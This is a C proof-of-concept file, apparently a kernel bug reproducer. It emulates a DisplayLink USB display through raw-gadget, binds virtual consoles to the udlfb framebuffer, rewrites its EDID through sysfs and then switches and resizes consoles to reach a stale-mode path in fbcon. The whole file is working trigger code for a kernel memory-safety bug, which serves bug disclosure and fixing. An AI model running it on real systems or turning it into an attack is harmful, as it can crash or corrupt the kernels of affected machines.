// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <sys/types.h>

#include <linux/types.h>
#include <linux/usb/ch9.h>
#include <linux/usb/raw_gadget.h>
#include <linux/kd.h>
#include <linux/vt.h>

static void logmsg(const char *fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	fprintf(stderr, "[poc] ");
	vfprintf(stderr, fmt, ap);
	fprintf(stderr, "\n");
	fflush(stderr);
	va_end(ap);
}

#define EDID_LENGTH 128
static unsigned char edid_blob[EDID_LENGTH];

static void build_edid(void)
{
	int i;
	unsigned char sum = 0;

	memset(edid_blob, 0, sizeof(edid_blob));

	edid_blob[0] = 0x00;
	for (i = 1; i <= 6; i++)
		edid_blob[i] = 0xff;
	edid_blob[7] = 0x00;

	edid_blob[8]  = 0x31;
	edid_blob[9]  = 0xd8;
	edid_blob[10] = 0x01;
	edid_blob[11] = 0x00;
	edid_blob[12] = 0x01;
	edid_blob[13] = 0x00;
	edid_blob[14] = 0x00;
	edid_blob[15] = 0x00;
	edid_blob[16] = 0x05;
	edid_blob[17] = 0x16;

	edid_blob[18] = 0x01;
	edid_blob[19] = 0x03;

	edid_blob[20] = 0x6d;
	edid_blob[21] = 0x1b;
	edid_blob[22] = 0x14;
	edid_blob[23] = 0x78;
	edid_blob[24] = 0xea;

	edid_blob[25] = 0x5e;
	edid_blob[26] = 0xc0;
	edid_blob[27] = 0xa4;
	edid_blob[28] = 0x59;
	edid_blob[29] = 0x4a;
	edid_blob[30] = 0x98;
	edid_blob[31] = 0x25;
	edid_blob[32] = 0x20;
	edid_blob[33] = 0x50;
	edid_blob[34] = 0x54;

	edid_blob[35] = 0x21;
	edid_blob[36] = 0x08;
	edid_blob[37] = 0x00;

	for (i = 38; i < 54; i++)
		edid_blob[i] = 0x01;

	edid_blob[54] = 0x64;
	edid_blob[55] = 0x19;
	edid_blob[56] = 0x00;
	edid_blob[57] = 0x40;
	edid_blob[58] = 0x41;
	edid_blob[59] = 0x00;
	edid_blob[60] = 0x26;
	edid_blob[61] = 0x30;
	edid_blob[62] = 0x18;
	edid_blob[63] = 0x88;
	edid_blob[64] = 0x36;
	edid_blob[65] = 0x00;
	edid_blob[66] = 0x1b;
	edid_blob[67] = 0x14;
	edid_blob[68] = 0x00;
	edid_blob[69] = 0x00;
	edid_blob[70] = 0x00;
	edid_blob[71] = 0x18;

	edid_blob[72] = 0x00;
	edid_blob[73] = 0x00;
	edid_blob[74] = 0x00;
	edid_blob[75] = 0xfc;
	edid_blob[76] = 0x00;
	memcpy(&edid_blob[77], "UDLFB PoC\n   ", 13);

	edid_blob[93] = 0x10;

	edid_blob[111] = 0x10;

	edid_blob[126] = 0x00;

	for (i = 0; i < EDID_LENGTH - 1; i++)
		sum += edid_blob[i];
	edid_blob[127] = (unsigned char)(0x100 - sum);
}

static int usb_raw_open(void)
{
	int fd = open("/dev/raw-gadget", O_RDWR);
	if (fd < 0)
		logmsg("open(/dev/raw-gadget) failed: %s", strerror(errno));
	return fd;
}

static int usb_raw_init(int fd, unsigned char speed, const char *driver,
			const char *device)
{
	struct usb_raw_init arg;
	int rv;

	memset(&arg, 0, sizeof(arg));
	strncpy((char *)&arg.driver_name[0], driver, sizeof(arg.driver_name) - 1);
	strncpy((char *)&arg.device_name[0], device, sizeof(arg.device_name) - 1);
	arg.speed = speed;
	rv = ioctl(fd, USB_RAW_IOCTL_INIT, &arg);
	if (rv < 0)
		logmsg("USB_RAW_IOCTL_INIT failed: %s", strerror(errno));
	return rv;
}

static int usb_raw_run(int fd)
{
	int rv = ioctl(fd, USB_RAW_IOCTL_RUN, 0);
	if (rv < 0)
		logmsg("USB_RAW_IOCTL_RUN failed: %s", strerror(errno));
	return rv;
}

static int usb_raw_event_fetch(int fd, struct usb_raw_event *event)
{
	return ioctl(fd, USB_RAW_IOCTL_EVENT_FETCH, event);
}

static int usb_raw_ep0_write(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, io);
}

static int usb_raw_ep0_read(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP0_READ, io);
}

static int usb_raw_configure(int fd)
{
	return ioctl(fd, USB_RAW_IOCTL_CONFIGURE, 0);
}

static int usb_raw_vbus_draw(int fd, uint32_t power)
{
	return ioctl(fd, USB_RAW_IOCTL_VBUS_DRAW, power);
}

static int usb_raw_ep0_stall(int fd)
{
	return ioctl(fd, USB_RAW_IOCTL_EP0_STALL, 0);
}

#define UDL_VENDOR_ID	0x17e9
#define UDL_PRODUCT_ID	0x4301

static struct usb_device_descriptor usb_device = {
	.bLength		= USB_DT_DEVICE_SIZE,
	.bDescriptorType	= USB_DT_DEVICE,
	.bcdUSB			= 0x0200,
	.bDeviceClass		= 0,
	.bDeviceSubClass	= 0,
	.bDeviceProtocol	= 0,
	.bMaxPacketSize0	= 64,
	.idVendor		= UDL_VENDOR_ID,
	.idProduct		= UDL_PRODUCT_ID,
	.bcdDevice		= 0x0100,
	.iManufacturer		= 1,
	.iProduct		= 2,
	.iSerialNumber		= 3,
	.bNumConfigurations	= 1,
};

static struct usb_config_descriptor usb_config = {
	.bLength		= USB_DT_CONFIG_SIZE,
	.bDescriptorType	= USB_DT_CONFIG,
	.wTotalLength		= 0,
	.bNumInterfaces		= 1,
	.bConfigurationValue	= 1,
	.iConfiguration		= 0,
	.bmAttributes		= USB_CONFIG_ATT_ONE | USB_CONFIG_ATT_SELFPOWER,
	.bMaxPower		= 0x32,
};

static struct usb_interface_descriptor usb_interface = {
	.bLength		= USB_DT_INTERFACE_SIZE,
	.bDescriptorType	= USB_DT_INTERFACE,
	.bInterfaceNumber	= 0,
	.bAlternateSetting	= 0,
	.bNumEndpoints		= 1,

	.bInterfaceClass	= 0xff,
	.bInterfaceSubClass	= 0x00,
	.bInterfaceProtocol	= 0x00,
	.iInterface		= 0,
};

static struct usb_endpoint_descriptor usb_ep_bulk_out = {
	.bLength		= USB_DT_ENDPOINT_SIZE,
	.bDescriptorType	= USB_DT_ENDPOINT,
	.bEndpointAddress	= 0x01,
	.bmAttributes		= USB_ENDPOINT_XFER_BULK,
	.wMaxPacketSize		= 512,
	.bInterval		= 0,
};

static int build_config(char *data, int length)
{
	struct usb_config_descriptor *config = (struct usb_config_descriptor *)data;
	int total = 0;

	if (length < (int)(sizeof(usb_config) + sizeof(usb_interface) +
			   sizeof(usb_ep_bulk_out)))
		return -1;

	memcpy(data, &usb_config, sizeof(usb_config));
	data += sizeof(usb_config);
	total += sizeof(usb_config);

	memcpy(data, &usb_interface, sizeof(usb_interface));
	data += sizeof(usb_interface);
	total += sizeof(usb_interface);

	memcpy(data, &usb_ep_bulk_out, sizeof(usb_ep_bulk_out));
	data += sizeof(usb_ep_bulk_out);
	total += sizeof(usb_ep_bulk_out);

	config->wTotalLength = (unsigned short)total;
	return total;
}

struct usb_raw_control_event {
	struct usb_raw_event	inner;
	struct usb_ctrlrequest	ctrl;
};

struct usb_raw_control_io {
	struct usb_raw_ep_io	inner;
	char			data[512];
};

#define UDL_REQ_I2C_SUB_IO	0x02
#define UDL_REQ_CHANNEL		0x12

static volatile int gadget_configured;

static bool ep0_request(int fd, struct usb_raw_control_event *event,
			struct usb_raw_control_io *io)
{
	int rv;

	switch (event->ctrl.bRequestType & USB_TYPE_MASK) {
	case USB_TYPE_STANDARD:
		switch (event->ctrl.bRequest) {
		case USB_REQ_GET_DESCRIPTOR:
			switch (event->ctrl.wValue >> 8) {
			case USB_DT_DEVICE:
				memcpy(&io->data[0], &usb_device, sizeof(usb_device));
				io->inner.length = sizeof(usb_device);
				return true;
			case USB_DT_CONFIG:
				rv = build_config(&io->data[0], sizeof(io->data));
				if (rv < 0)
					return false;
				io->inner.length = rv;
				return true;
			case USB_DT_STRING:
				io->data[0] = 4;
				io->data[1] = USB_DT_STRING;
				if ((event->ctrl.wValue & 0xff) == 0) {
					io->data[2] = 0x09;
					io->data[3] = 0x04;
				} else {
					io->data[2] = 'D';
					io->data[3] = 0x00;
				}
				io->inner.length = 4;
				return true;
			default:

				return false;
			}
			break;
		case USB_REQ_SET_CONFIGURATION:

			usb_raw_vbus_draw(fd, usb_config.bMaxPower);
			usb_raw_configure(fd);
			gadget_configured = 1;
			io->inner.length = 0;
			return true;
		case USB_REQ_GET_INTERFACE:
			io->data[0] = usb_interface.bAlternateSetting;
			io->inner.length = 1;
			return true;
		case USB_REQ_SET_INTERFACE:
			io->inner.length = 0;
			return true;
		case USB_REQ_GET_CONFIGURATION:
			io->data[0] = gadget_configured ? 1 : 0;
			io->inner.length = 1;
			return true;
		case USB_REQ_GET_STATUS:
			io->data[0] = 0x01;
			io->data[1] = 0x00;
			io->inner.length = 2;
			return true;
		default:
			return false;
		}
		break;

	case USB_TYPE_VENDOR:
		if ((event->ctrl.bRequestType & USB_DIR_IN) &&
		    event->ctrl.bRequest == UDL_REQ_I2C_SUB_IO) {

			unsigned int idx = event->ctrl.wValue >> 8;

			io->data[0] = 0x00;
			io->data[1] = (idx < EDID_LENGTH) ? edid_blob[idx] : 0x00;
			io->inner.length = 2;
			return true;
		}
		if (!(event->ctrl.bRequestType & USB_DIR_IN) &&
		    event->ctrl.bRequest == UDL_REQ_CHANNEL) {

			io->inner.length = event->ctrl.wLength;
			return true;
		}
		return false;

	default:
		return false;
	}

	return false;
}

static void *gadget_thread(void *arg)
{
	int fd = *(int *)arg;

	for (;;) {
		struct usb_raw_control_event event;
		struct usb_raw_control_io io;
		int rv;

		memset(&event, 0, sizeof(event));
		event.inner.type = 0;
		event.inner.length = sizeof(event.ctrl);

		rv = usb_raw_event_fetch(fd, (struct usb_raw_event *)&event);
		if (rv < 0) {
			if (errno == EINTR)
				continue;
			logmsg("event_fetch failed: %s", strerror(errno));
			return NULL;
		}

		if (event.inner.type != USB_RAW_EVENT_CONTROL)
			continue;

		memset(&io, 0, sizeof(io));
		io.inner.ep = 0;
		io.inner.flags = 0;
		io.inner.length = 0;

		if (!ep0_request(fd, &event, &io)) {
			usb_raw_ep0_stall(fd);
			continue;
		}

		if (event.ctrl.bRequestType & USB_DIR_IN) {
			if (io.inner.length > event.ctrl.wLength)
				io.inner.length = event.ctrl.wLength;
			usb_raw_ep0_write(fd, (struct usb_raw_ep_io *)&io);
		} else {
			usb_raw_ep0_read(fd, (struct usb_raw_ep_io *)&io);
		}
	}

	return NULL;
}

static int read_file(const char *path, char *buf, size_t len)
{
	int fd = open(path, O_RDONLY);
	ssize_t n;

	if (fd < 0)
		return -1;
	n = read(fd, buf, len - 1);
	close(fd);
	if (n < 0)
		return -1;
	buf[n] = '\0';
	return (int)n;
}

static int find_udlfb(void)
{
	int i;

	for (i = 0; i < 32; i++) {
		char path[128], name[64];

		snprintf(path, sizeof(path), "/sys/class/graphics/fb%d/name", i);
		if (read_file(path, name, sizeof(name)) < 0)
			continue;
		if (strncmp(name, "udlfb", 5) == 0)
			return i;
	}
	return -1;
}

static int open_tty0(void)
{
	int fd = open("/dev/tty0", O_RDWR);

	if (fd < 0) {

		mknod("/dev/tty0", S_IFCHR | 0600, makedev(4, 0));
		fd = open("/dev/tty0", O_RDWR);
	}
	if (fd < 0)
		fd = open("/dev/console", O_RDWR);
	return fd;
}

static void vt_activate(int ttyfd, int n)
{
	if (ioctl(ttyfd, VT_ACTIVATE, n) < 0) {
		logmsg("VT_ACTIVATE(%d): %s", n, strerror(errno));
		return;
	}
	if (ioctl(ttyfd, VT_WAITACTIVE, n) < 0)
		logmsg("VT_WAITACTIVE(%d): %s", n, strerror(errno));
}

int main(int argc, char **argv)
{
	int fd, rv, fbidx, ttyfd, edidfd, i;
	pthread_t th;
	char path[128];

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	build_edid();

	fd = usb_raw_open();
	if (fd < 0)
		return 1;
	if (usb_raw_init(fd, USB_SPEED_HIGH, "dummy_udc", "dummy_udc.0") < 0)
		return 1;
	if (usb_raw_run(fd) < 0)
		return 1;

	if (pthread_create(&th, NULL, gadget_thread, &fd) != 0) {
		logmsg("pthread_create failed");
		return 1;
	}
	logmsg("raw-gadget running, waiting for udlfb to probe...");

	fbidx = -1;
	for (i = 0; i < 600; i++) {
		fbidx = find_udlfb();
		if (fbidx >= 0)
			break;
		usleep(100 * 1000);
	}
	if (fbidx < 0) {
		logmsg("udlfb framebuffer never appeared");
		return 1;
	}
	logmsg("udlfb registered as fb%d", fbidx);

	sleep(2);

	ttyfd = open_tty0();
	if (ttyfd < 0) {
		logmsg("cannot open /dev/tty0: %s", strerror(errno));
		return 1;
	}

	{
		char fbdev[64];
		int fbfd;

		snprintf(fbdev, sizeof(fbdev), "/dev/fb%d", fbidx);
		fbfd = open(fbdev, O_RDWR);
		if (fbfd < 0) {
			mknod(fbdev, S_IFCHR | 0600, makedev(29, fbidx));
			fbfd = open(fbdev, O_RDWR);
		}
		if (fbfd >= 0) {

			struct { unsigned int console, framebuffer; } map;

			for (i = 1; i <= 6; i++) {
				map.console = i;
				map.framebuffer = fbidx;

				ioctl(fbfd, 0x4610, &map);
			}
			close(fbfd);
		} else {
			logmsg("no %s (fbcon takeover path only)", fbdev);
		}
	}

	for (i = 2; i <= 4; i++)
		vt_activate(ttyfd, i);
	vt_activate(ttyfd, 1);
	logmsg("VCs 1..4 bound to fb%d, fb_display[].mode populated", fbidx);

	snprintf(path, sizeof(path), "/sys/class/graphics/fb%d/edid", fbidx);
	edidfd = open(path, O_WRONLY);
	if (edidfd < 0) {
		logmsg("open(%s): %s", path, strerror(errno));
		return 1;
	}
	rv = write(edidfd, edid_blob, EDID_LENGTH);
	logmsg("write(%s, 128) = %d (%s) -- modelist destroyed", path, rv,
	       rv < 0 ? strerror(errno) : "ok");
	close(edidfd);

	for (i = 0; i < 8; i++) {
		int target = 2 + (i % 3);

		logmsg("switching to VC %d -> fbcon_switch() -> display_to_var()",
		       target);
		vt_activate(ttyfd, target);
		usleep(200 * 1000);
		vt_activate(ttyfd, 1);
		usleep(200 * 1000);
	}

	{
		struct vt_sizes sizes;

		sizes.v_rows = 20;
		sizes.v_cols = 40;
		sizes.v_scrollsize = 0;
		logmsg("VT_RESIZE 40x20 -> fbcon_resize() -> display_to_var()");
		if (ioctl(ttyfd, VT_RESIZE, &sizes) < 0)
			logmsg("VT_RESIZE: %s", strerror(errno));

		usleep(200 * 1000);

		sizes.v_rows = 25;
		sizes.v_cols = 80;
		sizes.v_scrollsize = 0;
		ioctl(ttyfd, VT_RESIZE, &sizes);
	}

	usleep(500 * 1000);
	logmsg("done (no crash observed)");
	return 0;
}
